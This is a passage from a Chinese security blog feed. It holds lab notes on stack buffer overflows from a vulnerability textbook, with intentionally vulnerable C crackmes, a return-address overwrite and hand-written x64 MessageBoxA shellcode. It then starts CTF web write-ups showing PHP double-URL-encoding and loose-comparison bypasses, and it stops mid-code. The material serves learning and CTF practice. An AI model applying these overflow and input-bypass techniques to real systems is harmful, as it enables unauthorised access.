src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-30-13.png" class=""><p>分析一下：大概在读取输入之后，调用了地址<code>0000000000401550</code>处的函数，找到该处</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-32-16.png" class=""><p>挺近的，可以发现<code>push rbp</code>压入栈底，然后在call完<code>strcpy</code>函数后打下断点</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-34-18.png" class=""><p>那么我们先运行程序到输入密码处，然后输入密码，开始调试程序</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-01_21-22-37.png" class=""><p>进入断点，此时我们知道存在一个<code>strcpy</code>函数，那么之后会有一个返回值，在内存中找到返回值的地方，选中上断点的反汇编代码，然后在详细信息表格中双击将要写入eax寄存器的那个内存的地址，然后会在内存试图里显示，由于我这里输入的是<code>xxxxxxx</code>，所以值是1，当然不能通过验证</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-52-58.png" class=""><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-58-52.png" class=""><p>如果我们输入8个<code>x</code>呢，可以发现，返回标志被溢出的换行符替换为0了，即可通过验证！</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_15-56-38.png" class=""><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-00-03.png" class=""><p>至于为什么是8个<code>x</code>，其实很好理解，因为定义的是一个8个字符的数组哒！刚好最后一个截断字符溢出哒！</p><p>刚好我们人为制造的字符数组和Auth相邻哒！</p><p>但是你会意外的发现，如果输入字符串小于<code>3xsh0re</code>，即使输入8个字符也不能冲破验证，这是因为小于则<code>strcmp</code>函数的返回值为-1，那么就会导致Auth的值为0xFFFFFFFF，就算淹没了两个字节变为0xFFFFFF00也无济于事的🤣</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-11_16-17-24.png" class=""><p>当然笔者这里还有一个办法，想办法在输入中跟上7个截断字符，刚好淹没所有的Auth，当然这里在命令行里输入不太方便，然后笔者发现在之后的crack实验，我们通过文件读取的方式可以实现！😎</p><h3 id="控制程序执行的流程"><a href="#控制程序执行的流程" class="headerlink" title="控制程序执行的流程"></a>控制程序执行的流程</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>​我们通过上面的学习，已经知道利用栈溢出可以修改邻接变量，更通用、更强大的攻击通过缓冲区溢出改写的目标往往不是某一个变量，而是瞄准栈帧最下方的 EBP 和函数返回地址等栈帧状态值。</p><h4 id="crack-me3"><a href="#crack-me3" class="headerlink" title="crack_me3"></a>crack_me3</h4><p>​用键盘输入字符的 ASCII 表示范围有限，很多值（如 0x11、0x12 等符号）无法直接用键盘输入，所以我们把用于实验的代码稍作改动，将程序的输入由键盘改为从文件中读取字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"3xsh0re"</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">"password.txt"</span>,<span class="hljs-string">"rw+"</span>))) <br>    { <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    } <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">"%s"</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    { <br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n"</span>); <br>    } <br>    <span class="hljs-keyword">else</span> <br>    { <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have passed the verification!\n"</span>); <br>    } <br>    fclose(fp); <br>}<br></code></pre></td></tr></table></figure><p>将上面的代码编译为exe，然后在同级目录下创建password.txt文件。</p><p>在动手之前，理清思路：</p><p>1.我们需要摸清楚栈中的状况</p><p>2.破解目标是通过密钥验证，所以应该知道密钥验证通过的指令地址</p><p>3.通过文件缓冲区溢出在返回地址处填上地址</p><p>通过x64dbg打开之前的编译好的文件，找到验证通过的指令地址。可以通过右键查找用户模块字符串快速找到。</p><p>可以得到地址为0x0000 0000 0040 161B，这里因为是在x86-64下，地址为64位，不同于书上是32位的。那么我们之后覆盖的返回值地址就是这里了😋</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_11-14-28.png" class=""><p>然后我们找到缓冲区的位置，首先在password.txt里输入“1234”，然后在通过调试在验证函数的下面这个地方打上断点：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-11-03.png" class=""><p>然后在堆栈区找到我们的缓冲区地址：我们这里是0000 0000 0061 F9D0，可以发现其中填充的是“34333231”，正是我们的输入。</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_18-13-46.png" class=""><p>接下来就是制作我们的payload了，从上面的图可以发现，要淹没返回值需要5*4个无效字节加上构造的返回值地址，这里为什么是5个不是6个，因为对于双字数据，在内存中的存放按照从地址低到高这里也就是1234，而在作为数值时是从高到低的，这是由于调试器的原因会在堆栈区按数值显示，也就是对于00..061F9D0的偏移在栈中是7-&gt;0，所以是填充6个。</p><p>使用winhex编辑txt文件的16进制，内容如下：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-19-01.png" class=""><p>然后运行，成功！</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-21-12.png" class=""><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-20-10.png" class=""><h3 id="在缓冲区植入代码"><a href="#在缓冲区植入代码" class="headerlink" title="在缓冲区植入代码"></a>在缓冲区植入代码</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>我们已经完成修改返回地址的壮举！😋那么我们为何不将返回地址改到我们自己的输入上呢，这样不就可以执行我们自己的代码了，那么我们的代码放哪，放缓冲区噻，之前填充的是无用的数值，填充指令不就可以了。</p><h4 id="crack-me4"><a href="#crack-me4" class="headerlink" title="crack_me4"></a>crack_me4</h4><p>和实验3一样通过文件读取，不过改了缓冲区大小，加入了包含窗口调用dll。目的是在缓冲区填充弹窗的代码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span> <span class="hljs-comment">//包含user32.dll</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">"3xsh0re"</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>{ <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">44</span>]; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>} <br>main() <br>{ <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    FILE * fp; <br>    LoadLibrary(<span class="hljs-string">"user32.dll"</span>);<span class="hljs-comment">//prepare for messagebox </span><br>    <span class="hljs-keyword">if</span>(!(fp=fopen(<span class="hljs-string">"password.txt"</span>,<span class="hljs-string">"rw+"</span>))) <br>    { <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <br>    } <br>    <span class="hljs-built_in">fscanf</span>(fp,<span class="hljs-string">"%s"</span>,password); <br>    valid_flag = verify_password(password); <br>    <span class="hljs-keyword">if</span>(valid_flag) <br>    {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"incorrect password!\n"</span>); <br>    } <br>    <span class="hljs-keyword">else</span> <br>    { <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulation! You have passed the verification!\n"</span>); <br>    } <br>    fclose(fp); <br>}<br></code></pre></td></tr></table></figure><p>和之前一样需要获得函数调用在内存中的返回返回到缓冲区的地址，打开x64dbg，开调！</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-27_22-56-32.png" class=""><p>根据之前的调试方法，我们可以找到缓冲区的地址：0000 0000 0061 F9B0，接下来就需要我们编写password.txt里的内容了，肯定是要淹没到返回地址的位置的，看看上面的堆栈信息，可以发现我们需要设置7*12345678+缓冲区地址。在Winhex里编辑如下：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-29-16.png" class=""><p>调试一下，发现成功淹没</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-31-00.png" class=""><p>接下来就是编写我们植入的代码，我们需要定位到内存中MessageBox的地址，这里不沿用书的方法，我们直接在x64dbg中查看符号文件，搜索即可得到地址为：0x00007FFB294DA000</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-25-41.png" class=""><p>然后编写shellcode：这里笔者花了大量的时间来写shellcode，</p><p><strong>第一个问题是一开始没有调高栈顶，也就是没有对rsp进行修改，导致运行时新入栈的值淹没了我的shellcode，所以调高了栈顶</strong></p><p><strong>第二个问题是发现无法在堆栈中执行命令，尝试在系统中关闭了DEP，但是还是不行，然后在调试器中，右键转到内存，然后右键该区域，内存权限，修改为可执行权限即可</strong></p><p><strong>第三个问题是发现64位的地址中会有0x00，不可避免，选择使用逻辑移位的方式构造跳转地址。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SUB rsp,64;调高栈顶，防止栈帧破坏shellcode<br>XORebx,ebx;得0<br>PUSHebx<br>MOV rax,0x3378736830726521;!er0hsx3<br>PUSHrax<br>MOVrax,rsp;将字符串指针给rax<br>PUSHebx;压入函数参数<br>PUSHrax<br>PUSHrax<br>PUSHebx<br>MOVrax,0x7FFB294DA0;防止0x00被截断，使用移位的方式构造函数地址<br>SHLrax,24<br>SHRrax,16<br>CALLrax;call MessageBoxA<br>ADDrsp,64;回收栈顶<br></code></pre></td></tr></table></figure><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-06-05.png" class=""><p>·<img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-21-16.png" class=""></p><p>右键修改可执行权限</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-22-12.png" class=""><p>全选然后设置权限</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-23-02.png" class=""><p>发现已经执行到MessageBoxA函数处😁：</p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-24-55.png" class=""><p>最后一个问题没有解决！为什么不弹窗！为什么！😅</p><p>第二章就结束了，虽然最后有个小遗憾，但是笔者已经花了大量的时间动手去完成任务，并且效果还不错，所以就不纠结于弹窗了哈哈😀</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-攻防世界-WEB-WP</title>
    <link href="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/"/>
    <url>/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/</url>
    
    <content type="html"><![CDATA[<p>好久没有做过web了，偶然翻到之前笔者曾经做过的一些攻防世界-WEB题目写的题解🐸，本人菜鸡一个😭😭😭😭</p><span id="more"></span><h4 id="1-PHP2"><a href="#1-PHP2" class="headerlink" title="1_PHP2"></a>1_PHP2</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>打开只有一个显示，“Can you anthenticate to this website?”，检查源代码也没有其他显示。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp1.jpg" class=""><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p>- </p><p>  <strong>phps文件就是php的源代码文件</strong>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p><ul><li>浏览器在将请求传回服务端时会对url解码一次后传回。</li></ul><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先访问index.php，回显没有变化。试着访问源码phps文件index.phps，发现源码</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp2.jpg" class=""><p>源码分析：当输入url中输入id=admin时，echo“not allowed!”，不是想要的结果。</p><p>我们发现浏览器会对url解码一次，然后urldecode再对url解码一次，相当于对url解码了两次，所以我们再url后跟的应该有url编码两次后的字符，查表，将字符a写为%25%36%31，浏览器解码一次后变为%61，再经过urlencode解码一次后为a，通过检验。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp3.jpg" class=""><h4 id="2-EasyPHP"><a href="#2-EasyPHP" class="headerlink" title="2_EasyPHP"></a>2_EasyPHP</h4><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>直接进入，发现php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>) &gt; <span class="hljs-number">6000000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>) &lt;= <span class="hljs-number">3</span>){      <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>) &amp;&amp; <span class="hljs-string">'8b184b'</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">6</span>,<span class="hljs-number">6</span>)){<br>        <span class="hljs-variable">$key1</span> = <span class="hljs-number">1</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Emmm...再想想"</span>);<br>        }<br>    }<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Emmm..."</span>);<br>}<br><br><span class="hljs-variable">$c</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">"m"</span>]) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-string">"m"</span>] &gt; <span class="hljs-number">2022</span>){<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]) == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>][<span class="hljs-number">0</span>])){<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"DGGJ"</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]);<br>        <span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no..."</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>){<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">"DGGJ"</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no......"</span>):<span class="hljs-literal">NULL</span>;<br>        }<br>        <span class="hljs-variable">$key2</span> = <span class="hljs-number">1</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no hack"</span>);<br>    }<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>}<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> &amp;&amp; <span class="hljs-variable">$key2</span>){<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">"Hgfks.php"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"You're right"</span>.<span class="hljs-string">"\n"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>}<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP substr函数：substr(<em>string,start,length</em>)</p><p>start：规定何处开始，<strong>可以是负数</strong>，表明在从<strong>字符串结尾</strong>的指定位置开始，-2表示从倒数第二个开始。</p></li><li><p>==<strong>PHP 中字符串与数值比较的陷阱</strong>==：</p><ul><li>当两个字符比较时，就是比较他们的ASCII码</li><li>两个字符串进行比较时，是从第一位开始比较其ASCII码，只要有一位出现了 差异，就返回比较结果。</li><li>当字符串与数字比较时，<strong>首先系统尝试将此字符串/字符转换为整型/浮点型</strong>，然后进行比较，如**’12bsd’转型为12<strong>，</strong>‘a’转型为0<strong>，千万需要注意的是此时不是将其对应的ASCII码值与数字进行大小比较了。其实同样的道理，’a’+10结果也是10。并且容易忽略的：</strong>0 与任意不可转化为数字的字符串比较(操作符为双等时。即松散比较), 均返回 true。**</li></ul></li></ul><h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>​        直接看到代码尾部有一个Hgfks.php，试着直接访问，发现不行，又访问Hgfks.phps，也不行，好吧，阅读前面的代码。首先从地址栏读取了a,b两个参数，第一个函数是if判断是检验a,b的值是否符合要求，首先对a，有个<strong>intval函数</strong>，将任意类型转为int型，然后这个值要大于6000000，且a的长度不超过3个字符。那么可以用9e9这种方式传入。再看b，<strong>是要b的MD5码的最后6位等于给定输入，尝试用bp爆破，也可以写python脚本碰撞</strong>。得到53724为b的值。</p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp4.jpg" class=""><p>继续阅读代码，发现有c作为值，试着绕过c，首先有一个json_decode(@$_GET[‘c’])，说明要c是post，json格式的数据，提交形式c={}，首先有一个m，m&gt;2022&amp;&amp;m不是数字，那么我们想到PHP中的松散比较，m不是数字，那么必然是字符串，<strong>字符串于数值比较时，如果包含数字，则尝试先转为只保留数字，如果不包含数字，则转为0，</strong>所以我们这里会有c={“m”:20222a}，m已经通过，向下走，发现c中还有一个变量n，首先n是一个数组，然后count()=2，说明其有两个元素。</p><p>那么修改c的形式c={“m”:”20222a”,”n”:[]}，可以发现出现了no hack字样，说明我们已经绕过了m的验证，然后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><p>说明n的第一个元素要为数组，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"DGGJ"</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">"n"</span>]);<br><span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no..."</span>):<span 